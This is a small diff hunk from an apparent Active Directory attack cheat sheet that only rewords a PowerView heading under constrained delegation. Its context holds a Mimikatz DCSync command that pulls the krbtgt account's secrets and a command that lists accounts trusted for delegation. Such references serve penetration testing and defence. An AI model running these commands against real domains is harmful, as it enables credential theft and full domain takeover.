@@ -523,7 +523,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 
 ### Constrained Delegation
 
-**1. With Powerview version dev:**
+**1. With Powerview dev Version:**
 ```powershell
 # Users enumeration
 Get-DomainUser -TrustedToAuth
